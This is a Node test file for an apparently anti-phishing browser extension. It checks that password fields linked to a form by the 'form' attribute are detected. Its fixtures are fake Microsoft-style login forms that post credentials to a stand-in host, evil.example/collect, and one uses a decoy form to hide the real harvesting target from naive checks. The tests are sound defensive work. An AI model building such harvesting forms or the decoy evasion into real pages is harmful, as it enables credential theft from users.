import assert from "node:assert/strict";
import fs from "node:fs";
import test from "node:test";
import { JSDOM } from "jsdom";

const contentSource = fs.readFileSync(
  new URL("../content.js", import.meta.url),
  "utf8"
);

function extractFunction(source, name) {
  const start = source.indexOf(`function ${name}(`);
  if (start < 0) throw new Error(`missing function ${name}`);
  let depth = 0;
  for (let i = source.indexOf("{", start); i < source.length; i++) {
    const ch = source[i];
    if (ch === "{") depth++;
    else if (ch === "}") {
      depth--;
      if (depth === 0) {
        const body = source.slice(start, i + 1);
        return new Function(`${body}\nreturn ${name};`)();
      }
    }
  }
  throw new Error(`unterminated function ${name}`);
}

const formHasPasswordField = extractFunction(
  contentSource,
  "formHasPasswordField"
);

function documentFor(html) {
  return new JSDOM(html, { url: "https://phish.example/login" }).window
    .document;
}

function blockingWouldFire(document) {
  const forms = document.querySelectorAll("form");
  for (const form of forms) {
    if (!formHasPasswordField(form)) continue;
    const action = form.action || "";
    if (!action.includes("login.microsoftonline.com")) return true;
  }
  return false;
}

test("password linked with the form attribute belongs to that form", () => {
  const document = documentFor(`
    <form id="login" action="https://evil.example/collect" method="post"></form>
    <input type="email" name="loginfmt" id="i0116" form="login">
    <input type="password" name="passwd" form="login">
    <button type="submit" form="login">Sign in</button>
  `);
  const form = document.getElementById("login");

  assert.equal(form.querySelector('input[type="password"]'), null);
  assert.equal(formHasPasswordField(form), true);
  assert.equal([...form.elements].some((field) => field.name === "passwd"), true);
  assert.equal(form.action, "https://evil.example/collect");
  assert.equal(blockingWouldFire(document), true);
});

test("nested password fields are still detected", () => {
  const document = documentFor(`
    <form id="login" action="https://evil.example/collect" method="post">
      <input type="password" name="passwd">
    </form>
  `);
  assert.equal(formHasPasswordField(document.getElementById("login")), true);
  assert.equal(blockingWouldFire(document), true);
});

test("a form that posts to Microsoft is not blocked for having a password", () => {
  const document = documentFor(`
    <form id="login" action="https://login.microsoftonline.com/common/login" method="post"></form>
    <input type="password" name="passwd" form="login">
  `);
  assert.equal(formHasPasswordField(document.getElementById("login")), true);
  assert.equal(blockingWouldFire(document), false);
});

test("a form without a password field is not treated as a credential form", () => {
  const document = documentFor(`
    <form id="login" action="https://evil.example/collect" method="post">
      <input type="email" name="loginfmt">
    </form>
  `);
  assert.equal(formHasPasswordField(document.getElementById("login")), false);
  assert.equal(blockingWouldFire(document), false);
});

test("the password is attributed to its form owner, not an ancestor form", () => {
  const document = documentFor(`
    <form id="decoy" action="https://login.microsoftonline.com/common/login">
      <input type="password" name="passwd" form="harvest">
    </form>
    <form id="harvest" action="https://evil.example/collect" method="post"></form>
  `);
  const decoy = document.getElementById("decoy");
  const harvest = document.getElementById("harvest");

  assert.equal(decoy.querySelector('input[type="password"]') !== null, true);
  assert.equal(formHasPasswordField(decoy), false);
  assert.equal(formHasPasswordField(harvest), true);
  assert.equal(blockingWouldFire(document), true);
});

test("credential blocking calls formHasPasswordField instead of a descendant query", () => {
  const first = contentSource.indexOf('case "form_action_validation":');
  const second = contentSource.indexOf(
    'case "form_action_validation":',
    first + 1
  );
  assert.notEqual(first, -1);
  assert.notEqual(second, -1);

  for (const start of [first, second]) {
    const slice = contentSource.slice(start, start + 700);
    assert.match(slice, /formHasPasswordField\(form\)/);
    assert.equal(
      slice.includes('form.querySelector(\'input[type="password"]\')'),
      false
    );
  }
});
